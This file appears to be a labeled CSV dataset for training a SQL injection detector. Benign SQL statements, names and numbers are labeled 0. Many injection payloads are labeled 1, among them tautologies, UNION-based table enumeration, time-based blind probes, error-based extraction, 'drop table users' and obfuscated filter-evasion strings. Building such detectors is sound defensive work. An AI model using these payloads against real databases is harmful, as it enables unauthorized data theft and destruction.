Query,Label,cluster,stratify_col
"1'/*!12345*/and/**/substring(database(),/**/1,/**/1)/**/=/**/'s' --",1,9,1_9
"0o5 
 )  /*(select|(select (select+(select (select (select (select 1)))))))](*/ ) ~ <as jyfo where (select!0x1fb0x8)=8x8fb9  && ^0o0o0x1o9x0b1100001a `like    ( ?select count ;( <*` )?  from rdb$fields as t1,rdb$types as{t2,rdb$collations as t3,rdb$functions as&t0o4  )  or?0o0  or  false or false {and  true and true  &&  true--",1,2,1_2
"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,1,1_1
select * from hung where easily not like '[bill]%',0,7,0_7
"]or 0x0/*(select (select 2));}	v0b0*/ =
 0b10 and:0x1   &&  .(select 6053) not  like  (select (select (select 1034)))and""2"" like ""2"" and (select (select 3734)) like 3734 or false and true --",1,4,1_4
or 'a'  =  'a,1,0,1_0
select * from double where    not wheel = 'knew',0,5,0_5
"""/*(select 2x4))(select
(select)0b0o0o0o7o5))a0b0b1010qlrh>oppezu""|elu*/or)""x""  andÃ¢Â /*t*/""}.p""<notlike~""}.p0b1000"" or false#
=<:""xl<",1,2,1_2
"moreno lopez, 55, 9-e",0,0,0_0
"1""   )    )   and   (  select 0x0x2*  (  if  &( @<[( ;`select * from  ;(  select	concat  (  0x0x21233aa0x57,  ([+select,  (  elt  (  (select0xd9c)`}=: 0xd9c,(select (select 0x3))  ) +  )     )  ,0x5b1011001101a0b1011110111a75,0x0x4e  &)  +])  
s  )  ,
0x0b1110101010010dcfb7617fffa, 0x75a35fa0b10101c89afda   )   )  ?
 )  { and ?   ( ;  (
< ""rqxd"" like  ""rqxd",1,4,1_4
"pi y margall 17, 7?f",0,0,0_0
"%u0027/*!12345*/union%u0020select%u00201,2,3--",1,2,1_2
"1'   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1_1
waitfor delay '0:0:5'----3ujaz7,1,0,1_0
' or exists(select 1 from users)----hytj5cv,1,4,1_4
"1' where 9222  =  9222 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1_1
select * from express fetch first 50 percent rows only,0,0,0_0
"  select   str_to_date ( ""august 10 2017"", ""%m %d %y"" ) ;",0,2,0_2
stimson_holbrook@cementosanfranq.ly,0,0,0_0
"-3587'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'psqt' like 'psqt",1,9,1_9
-3613%'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  '%'  =  ',1,9,1_9
select * from rhyme order by heavy desc,0,7,0_7
"  select recently,setting from century where be = 'solve' union select avoid, addition from front",0,7,0_7
"1   )    )     )   union all select null,null--",1,4,1_4
1   )    )     )   order by 1--,1,4,1_4
select * from he where castle in  ( select somewhere from trace ) ,0,7,0_7
cath,0,8,0_8
"1'+  (  select acax where 4169  =  4169 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",1,9,1_9
zubicueta vallb,0,8,0_8
select sleep  (  5  )   and    (    (   '%'  =  ',1,4,1_4
"1""  )   where 9511  =  9511   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1,4,1_4
"1' or ascii(substring(database(), 1, 1)) > 100  and 'a'='a'--",1,9,1_9
"-3729'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'czed'  =  'czed",1,9,1_9
"1   )    )     )   union all select null,null,null,null,null,null,null,null#",1,4,1_4
1'+  (  select 'wyxu' where 2555  =  2555 union all select null#,1,6,1_6
"select column1 , column2 , column3 , ... from table1 where condition ; insert into customers  ( customername, city, country )  ",0,1,0_1
' or exists(select 1 from users)--#fbogth263ck9kq9,1,4,1_4
"1%""   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,1,4,1_4
sahid,0,8,0_8
"1""  )     or   (select!(select (select (select (select (select 8384))))))=like  ( 'abcdefg',upper  (  hex\=(  randomblob  (  (select 0x1ad72b88)/(select 0o0x0)   )    )     )    )    ,and   [( ?""zbwn""[ like  ""zbwn",1,4,1_4
select * from forest fetch first 50 percent rows only,0,0,0_0
'/**/or/**/exists(select/**/1/**/from/**/users)--#soshpi6cxl6o7ns,1,0,1_0
-4669  )   or 2452  =  1601#,1,6,1_6
"' union select null, null, null --",1,4,1_4
1'+  (  select zpdf where 2938  =  2938,1,6,1_6
; select pg_sleep(5); --,1,0,1_0
" select * from users where id  =  1 union select @ _,version  (    )   -- 1",1,5,1_5
select * from turn fetch first 3 rows only select top 50 percent * from stood,0,5,0_5
"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""felm""  =  ""felm",1,4,1_4
waitfor delay '0:0:5'----ghmu7ir,1,0,1_0
1  )   where 2232  =  2232,1,6,1_6
taciano,0,8,0_8
";drop
tableusers;
--",1,0,1_0
huelva,0,8,0_8
5130,0,3,0_3
";select
pg_sleep(5);--",1,0,1_0
"'a'='a'--
",1,0,1_0
72ic5oid4,0,3,0_3
"1%""   )    )     )  ",1,2,1_2
"  select * from change where newspaper in  ( 'caught', 'ahead', 'pie' )  ",0,5,0_5
select 'qqpjq'||  (  case 5118 when 5118 then 1 else 0 end  )  ||'qzvzq' from rdb$database,1,2,1_2
2569,0,3,0_3
select count ( distinct wash )  from steep,0,1,0_1
%u0027/**/or/**/%u00271%u0027in/**/(1)%u00271,1,2,1_2
"'     and     1	=	convert(int,@@version) or 'b'='b'--",1,9,1_9
"-1868""  )   where 9495  =  9495 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,4,1_4
"%u0027%u0020union%u0020select%u00201,2,3%u0020or%u0020%u0027b%u0027=%u0027b%u0027--",1,2,1_2
"1""  )   where 1833  =  1833",1,6,1_6
"1""  )   where 2837  =  2837 and   (  3020  =  3020  )  *6703--",1,6,1_6
"1' union select table_name, null, null from information_schema.tables  /*!*/and 1=1----z0uaq0fqfnuwu9p",1,6,1_6
admin' or '1'='1#1oh0dxwg4o,1,9,1_9
1' in boolean mode  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  #,1,4,1_4
0%' and 0b0b0x1194+=\  (  select 0b9x2792 from$pg_sleep  (;	(select>5x0b101)  .)   +)  - or !false/*g):e*/and (select (select (select (select (select 1))))) --,1,4,1_4
"4b1"";where~0x0905	=	0b1100101100101",1,0,1_0
merl,0,8,0_8
delete from south where wolf = 'drawn',0,5,0_5
"0o0x7'+]^or-%_8x7x0x13e=Ã¢Â _({[selectcount+`($^*[<)	=from)all_users%t1,all_users/*d))cip@g3h\mom'mb2w~s*/t0b0b61b0b0o10b308,all_users/t0b0x0o1,all_users
t0x4o2x0o2b0b0b0x0x1,all_users/*ahzm9|pjtns`*@8w5*/t0b0x1fx6b0x0o9b6x3e""{)_	""and('yfkk'=orÃ¢Â (select)(select)(select (select (select 7285)))))~not like`(select (select 7285))  &&  ^true;or (select (select-0x243))=(select (select 1592)) and 7190 not like 0x1c17  or  false'or false or false and:true#'yfkks<f3uf",1,0,1_0
guino osarte,0,8,0_8
"   select employees.sugar, count ( orders.secretid )  as situationfrom    ( ordersinner join thrown on orders.morningid  =  employees.butid ) ",0,1,0_1
"1  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,4,1_4
select * from  ( select greatest from pink ) ,0,7,0_7
select * from wp_posts where id  =  28072 limit 1,0,5,0_5
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'cxjp'  =  'cxjp",1,1,1_1
"1%"" and_1x0o0x688/*z4m""a4(x-sifb]*/ like  benchmark  (  2x2c4b0x28,md0b0x65  ( `0x2d457153   )    )    ~   &&  }  true or""false and 'b' not like 'b}' or!(select 0xffb) not like 0xffb   or  	8x479 like 7x478 and 0o0x18e7=(select (select (select (select (select (select (select (select 0x19eb)))))))) or false  or  0x8Ã¢Â or?(select 0x24be)/ like 
0x24bf$and true or (select (select (select (select/**/(select (select 0))))))##m#t<5w",1,4,1_4
"1' union select table_name, null, null from information_schema.tables ----cwmtg62y",1,4,1_4
"1',extractvalue  (  9788,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  9788  =  9788,1   )    )     )  ,0x717a767a71   )    )   ",1,4,1_4
' and 1like1 -- ,1,0,1_0
; select pg_sleep(5); ----2fetw,1,0,1_0
"admin"";or\""7o0b0x5b0b0b0o0b101""]/*^)n,e!kp=j0o73spon*/=|~""0o9b8b3b7""/*",1,2,1_2
select * from excitement 3 select * from level,0,5,0_5
"1))			union			select			1,database(),3 or 'b'='b'--",1,4,1_4
r3nci8l5so,0,8,0_8
select * from claws where room  between 10 and 20,0,5,0_5
"' a/*!12345*/nd 1=convert(int,@@version)--",1,0,1_0
"1'||  (  select 'jpso' from dual where 9357  =  9357 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",1,9,1_9
; drop table users;  or (1)--#ru5edj3w,1,0,1_0
" select * from root order by electric asc, remarkable desc",0,7,0_7
"0o1""   )    ) 	 	[)   or (select (select (select (select 3b0x20bf))))  like  like-	(  'abcdefg',upper  (  hex^ (/>r and omblob  (]Ã¢Â 0o0o0b11101116111010110063105000090/(select (select (select (select (select (select (select (select (select 2)))))))))   )    ), /*.!rq*/   )   	) =&&  (  
 (    (; ""nevr""	like ""nevr",1,4,1_4
;/**/drop/**/table/**/users;/**/ and 'a'='a'--#tkk4fpaxw,1,0,1_0
3953,0,3,0_3
"4%""  [)    )}   and   (  select/*fr~i*/0x836b from  (  select count  (  *  )  ,concat  ( }0x7371717a0x48,  (  select 	 (  elt  (  0b0x236b ""like  0x4x236b,0x1   ) *  )  +  )  ,0b0o0x717a768a71,floÃ¢Â or   (  rand  ( /(select (select?(select (select 2x0))))  )  *(select (select (select (select (select (select (select 2)))))))   ) ;  )   x from<inf or mation_schema.character_sets&group by x  ) !a  )and=( ,	 (  [""%""Ã¢Â -like <""",1,2,1_2
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""jcyh""  =  ""jcyh",1,4,1_4
8en7dill3,0,3,0_3
"  update cry set feel =  'operation', city =  'stage' where wrapped =  melted",0,5,0_5
"1>=1--/*
*/",1,6,1_6
"   select count ( positive ) , sentence from ahead by sometime",0,1,0_1
' or '1'='1,1,9,1_9
"select * from union where either between ""information"" and    ""pine""",0,2,0_2
"select monthname ( ""2017-06-15 09:34:21"" ) ;",0,6,0_6
' or '1'in (1)'1 /*!*/and 1=1,1,6,1_6
"0o1' or   (  select 'tznb'Ã¢Â from dual where 8338  like {(select (select (select 0x22a4)))rlike   (  select * from?  (  select  (  sleep >(  (select 5)  ?)    )     ) {vwyq ) : or false  or  false  or  ""@""!=""@""#wks{c",1,2,1_2
1'||  (  select 'awba' from dual where 3749  =  3749 and 1445  =  3334--,1,6,1_6
"1""= .)/*b&lx~p[/?n
?o0x3bs*/:. )<Ã¢Â >Ã¢Â /**lulqxjo0*/)  ]and 1o4x0b0b1130001f9	 like   (select	(select 0x11a4))]orÃ¢Â false*and	true)or false#+y.ffz",1,2,1_2
04or2ativ1,0,3,0_3
";droptableusers;/*
*/--",1,0,1_0
-9024  )   where 1686  =  1686 or 3069  =  8213--,1,6,1_6
almoharn,0,8,0_8
"1""/**/where@1166	=^0b10010001110",1,0,1_0
" select * from users/*yh	})mx!-*/where id 	=
 6o7	or \<
=0o0x0 union*select (select (select 7)),@@version  or/*(select (select 1))?s;*/ false&and ""z3i""/like ""z3i"" or_'g'!not like 'g'||(select (select 0))  or  false and true and (select 1) -- 0o1fw[",1,4,1_4
2.03996e+015,0,3,0_3
1%'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  ',1,9,1_9
"5"" where:(select 2x55d1)=(select 0x10f0x9)and0x0o0o19442  like  utl_inaddr.get_host_address|](  chr  (  (select.5x71)  ) \ or chr  (  (select (select (select (select/**/(select (select (select 113)))))))  )  ||chr}
(> 6x0o1a2  )   or:chr  (  0o3x6a	 )   or chr  (  (select (select 113)) 	) or (  select   (  case when , (  0x1122=0o06339  )   then 1 else 0x9~end\ )   from dual  )  ||chr  (  (select 0x8f)* )}  ,or  chr  (  0x7a	 )~\	or chr  (  (select (select 117))  )  ||chr  (  9x0b0o112  )  ||chr  ( *(select (select (select 113)))[  )   `) 	 and,(select (select (select 1))) && true || false  or [""""+oj"" like """"+ojo"" and true and true and true and 'u'='u' and(true or (select (select (select (select (select 6))))) and true  and  true or "";t"" like "";ty"" or false or false|and true/**/&& true  or  false or (select 3) or false and 1 --",1,4,1_4
1'   )    )    as vdhw where 8858  =  8858 order by 1#,1,6,1_6
select min ( whom )  as new from plastic,0,1,0_1
" select * from users where id  =  1 or "",  )  ""  =  1 or 1  =  1 -- 1",1,6,1_6
"6""=)% + )
   )""@ `  or    0x2x9o0b0o0x0o5b2x0x0xaa0x1  or  false#Ã¢Â like ! ]( >select count
((	 *+;)%/*from_all_users t5,all_users^t0o4b10,all_users t0o1x0x5,all_users t0o0o0o1x0x0b0o0b9x5x8e,all_users<t5 >)  (and/*@(select 0o0x9)<ikok>h`(select (select (select (select (select (select (select (select (select 2)))))))))jk)(select""0o0x1).*/  `(+ ]:(__~-.(? ""ddun"" `=/*aw>0x2b;ide{va[?""*/ ""ddunpsf",1,4,1_4
"1 where 0xa72` like  0b108001010517 and (select (select (select (select (select (select (select (select
(select 8514))))))))) /**/=    (  select count  (  *  )Ã¢Â   from\domain.domains as t9,domain.columns$as t0b11,domain.tables as t3 @)  or false or false    &&    true|--",1,4,1_4
-1564'  )   order by 1--,1,6,1_6
7x0x29be7737ec92bb86eef0x0xffcd772744bdeec00/*32a0*/...,1,0,1_0
"1'+  (  select yfuu where 1717  =  1717 union all select null,null,null,null,null,null,null,null,null--",1,4,1_4
4.23439e+015,0,3,0_3
select min ( own )  as window from had,0,1,0_1
"1%' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1_1
select * from than where peace = 'care' limit 3,0,5,0_5
select * from nervous where sign = 'shade',0,5,0_5
"1%""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,1,4,1_4
test' or '1'='1' /*,1,9,1_9
" select * from rays order by couple asc, highway desc",0,7,0_7
-4906'   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'pkrq'  =  'pkrq,1,9,1_9
select avg ( complex ) from engine select sum ( clock ) ,0,1,0_1
or`a=~a,1,2,1_2
5796160000000000,0,3,0_3
delete from lead where thus = 'trouble',0,5,0_5
"select column1 , column2 , ... from table_name where condition ; create or replace view [brazil customers] as ",0,7,0_7
waitfor delay '0:0:5'  )  +',1,0,1_0
"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",1,4,1_4
test'				or				'1' =	'1'				/*--tc3d9g7,1,9,1_9
" select column_name ( s )  from goes,differ",0,1,0_1
"1""  )   and elt  (  4249  =  4249,7259  )   and   (  ""xgka"" like ""xgka",1,4,1_4
' or 1in (1)1 -- ,1,4,1_4
"0o5x0o0o0o0x0o1o1xc%""   )
   )+   rlike'  (  select   (  case;when   (<0b0x0dff  like`&(select (select!(select (select (select 0o6162)))))	 )  :then(0x0x6x8 else 0o0x82 end   )<"";) &&/*%(select (select (select 7)))*/ (    (|  ""%""=""",1,2,1_2
select   (  case when   (  1868  =  5071  )   then 1 else 1868*  (  select 1868 from master..sysdatabases  )   end  )  --,1,4,1_4
35807418y,0,3,0_3
" select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",1,4,1_4
"if(substring(database(),
1,1)='a',",1,4,1_4
"'or
1=1/*
*/--",1,6,1_6
"select count  (  *  )   from generate_series  (\ (select/**/1),(select&9x4c4e60) *) \ and  %(  'cewn' like  'cewn",1,4,1_4
chimenea,0,8,0_8
"1%u0027%u0020and%u0020substring(database(),%u00201,%u00201)%u0020in/**/(1)%u0020%u0027s%u0027%u0020--",1,2,1_2
"1'unionselect
table_name,null,nullfrominformation_schema.tables/*!*/and1=1--",1,0,1_0
select top 50 percent * from leather select * from announced fetch first 50 percent rows onlyselect top 3 * from anyone,0,5,0_5
tro8e0e1!0,0,0,0_0
manquel,0,8,0_8
select min ( create )  as rate from ago,0,7,0_7
"0b0o5""  )%; as/*fo*/nfpe}where (select 0b10xa97) &like  2679",1,2,1_2
1'+  (  select 'xqjx' where 7048  =  7048 and 9198  =  9198--,1,6,1_6
select * from occur fetch first 50 percent rows onlyselect top 3 * from liquid,0,0,0_0
 update collect set couple = 'battle'where bigger = 'earth',0,5,0_5
"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",1,9,1_9
select * from shout fetch first 3 rows only select top 50 percent * from full,0,5,0_5
-6218'   )    )    or 2236  =  4469#,1,6,1_6
'      and      1 = 1      --,1,6,1_6
"8b0b1'{`
 or/**/.`/**/updatexml  ("" 0b0b0b0b0b11000111111110100110110101100011010001101111001111101100110100011010011101101011111100001101011100100101011010,concat| ( *0o0x0b0o2e,0x7171306a0x47,  ( ~select,  ( 
elt/*p0b100(}mnd*/{(? (select 8x719)],like  (select (select (select|(select (select (select (select 0x5ee))))))),(select 0b0x0o1)   )   !)     ) 
,0o3b0x127a767a72  ): ,0x1fe6& ) $)and'nhmz'like='nhmz",1,9,1_9
select * from library where community = 'exact',0,5,0_5
select * from yes where certainly in  ( select heard from track ) ,0,7,0_7
"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ",1,4,1_4
' && (1=1)1=1 -- ,1,6,1_6
en546al,0,8,0_8
2389470000000000,0,3,0_3
"-8294%' union all select 8728,8728,8728,8728,8728,8728,8728,8728,8728,8728#",1,4,1_4
select * from think where consist = 'face',0,5,0_5
1'  )   where 5491  =  5491 and 9198  =  9198--,1,6,1_6
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""rbqs""  =  ""rbqs",1,4,1_4
select top 3 * from careful where interest = 'beyond' select * from fence,0,5,0_5
select * from shoe where price not between 10 and 20,0,7,0_7
select avg ( ourselves ) from bottle select sum ( back ) ,0,1,0_1
albero bajo,0,8,0_8
"1'+  (  select 'fpnz' where 1592  =  1592 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",1,9,1_9
"0b0o1%"" !)    or  row  (  0x40b,(select (select 0x1d8a))  )  >  ( `select count	 ( .*  )  ,concat) (  0x0b10911101910100111111010a76,  (  select   (; elt  (  0x415$ like  (select 0x415),0o0x0x0o6  {)    )    =)  ,0x0x0o7cda0x2ffa71,floor  ( Ã¢Â r and   (  0b0o0x0  )  *(select 0b111) Ã¢Â  )    )   x from^ '( -select 9x2128 union select (select 0x15d0x0),union select (select (select (select (select (select (select 2051))))))/*ighnh1}7it*/union select (select (select (select (select 0xc1a))))  )%/*{qhl1*/a group}by x  )   and   (  ""%""  like 
""",1,4,1_4
8120300000000000,0,3,0_3
adashevsky@theroxyblue.com,0,0,0_0
"1' and substring(database(), 1, 1) <= 's' --#g1w8vnel351sp3",1,9,1_9
12480,0,3,0_3
select * from measure where burn = 'pretty' limit 3,0,5,0_5
"4o0o0b0b111b1010b3b0o0o0o0o0b110110001x8b0o0b1400o0b0o5o0o0o0o0o3x9b0b11o0b010b0b0o12x9o2o2x0b4b9%'_union*all}select/*culiz0mt_g<=mu*chjw2zsrmi*/null,null,null,null,null,null,null,null,null,null--",1,4,1_4
select * from search where command  between 10 and 20,0,5,0_5
select avg ( complete ) from iron,0,1,0_1
"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""okpa""  =  ""okpa",1,4,1_4
6164300000000000,0,3,0_3
"1 and make_set  (  6911  =  1867,1867  )  ",1,4,1_4
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 367676 )  order by meta_id asc",0,7,0_7
"  select period_add ( 201703, 15 ) ;",0,4,0_4
select * from zero fetch first 3 rows only select top 50 percent * from mirror,0,5,0_5
6529220000000000,0,3,0_3
select * from  ( select oxygen from shells ) ,0,7,0_7
-3243 or 2266  =  3583#,1,6,1_6
-6081 where 3681  =  3681 or 2603  =  3138--,1,6,1_6
"1'~* )   )	^ ^as oldh where 0o0o0o0x6x0o0o20f like!0o0x254f union all select'null,null,null   or / '0o6' not='0' and	""|"" <> ""|4"" and@true and (select 0x0x1) and true and (select (select (select (select (select
(select (select 1))))))) or ""y;""<not like ""y;"" and true or false or false  &&  true#e_l	ekdsg9ubc",1,4,1_4
"0b1%""/**/?)   andÃ¢Â 0x0b111d6/*^}]i*/ like  0b11111010160",1,2,1_2
"9b0b0000
exec;sp_(/*gd^h4`	az?b*/(  or_exec/xp_'/**/)_",1,0,1_0
"1)     union     select     1,database(),3 or 'b'='b'--",1,0,1_0
"select * from generate_series  (  6414,6414,case when   (  6414  =  6455  )   then 1 else 0 end  )   limit 1--",1,4,1_4
eulalio,0,8,0_8
ji-chuu,0,0,0_0
select   (  case when   (  9490  =  6134  )   then 9490 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,4,1_4
53087910t,0,3,0_3
"com/?option  =  com_k2  <act>  <![cdata[procmemberinsert]]>  </act>   <act>  <![cdata[procmemberlogin]]>  </act>   <allow_comment>  <![cdata[]]>  </allow_comment>   <allow_trackback>  <![cdata[]]>  </allow_trackback>   <birthday>  <![cdata[19850616]]>  </birthday>   <content>  <![cdata[ <img src  =  ""http://media2",0,0,0_0
select potatoes ( s )  from exact full outer join,0,1,0_1
select * from man where prove in  ( select are from way ) ,0,7,0_7
"1'   )    )    as bsvk where 5985  =  5985 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1,4,1_4
1 rlike sleep  (  (select (select 0x8))  )  |&& }4x0o0x8`   &&    'uk4o0b110;'='uk3;' or (select (select.(select (select 0))))Ã¢Â -->muhpj],1,2,1_2
fortet esquer,0,8,0_8
sabanaya4,0,8,0_8
select min ( safety )  as ancient from present,0,1,0_1
"1""  )   and 4595  =  4595#",1,6,1_6
"waitforÃ¢Â delay<'5o0b0:4b8x6o0x5x4x8:1o0b101'?and	*>(,	'gpqx'/*fcvzhtosjr)*/like('gpqx",1,2,1_2
"admin'or'1'='1/*
*/",1,9,1_9
select * from friend 3 select * from percent,0,5,0_5
"1' or   (  select 'uyfo' where (select (select\0b0x4b6)) like (select (select 0x4d1)) or,0o12246 ]=  	/**/( ^select`count  (  *  )   from all_users t0,all_users t2,all_users
t3,all_users t0x4x0,all_users/*h (select (select (select (select 0x1))));w{lh(l and (select 419)!=(select 420) or false or false#=h\*/t0&/**/ )   `) ;  ;or/**/ 'i^dj~",1,9,1_9
"""Ã¢Â or%sleep,(]=__time__/*i*`_qv&,*/
)	>Ã¢Â and/*js0x8^?>i&ah3*/3x7o0b0b2o8x0o0o0b11o9and&1
or""7'and{true  and  (select (select;7853))=0x1ead#v	k5o4a\8kq1&",1,2,1_2
"1',{ (  select ; (  case when&  (  0x0b101101001110=8556  )   then (select (select (select (select 2)))) else (select 0o14704)*
 (  select 0o20624 from mysql.db  )   end	  ) , )   ",1,4,1_4
lores bigas,0,8,0_8
"1' union select table_name, null, null from information_schema.tables --",1,4,1_4
"""? !)  
 )- "".!{ 
or&(>(/\$,(   '(.  ""x""  !)$ ;;)<
/*`ct0o0b130!kamq0o5x6a^t7nz(h*/  like/*(select{7b110o5x0o2o2o2x6b0b7x8x0b10110b)}t}(select:0o0x0b0b0x0o0o3b0xa)*/   ?( \?[(  <""x",1,2,1_2
pernign,0,8,0_8
"' union select 1,2,3----sh3sgd03vvi",1,4,1_4
"or?(select (select 6))
=}0x0x7--",1,4,1_4
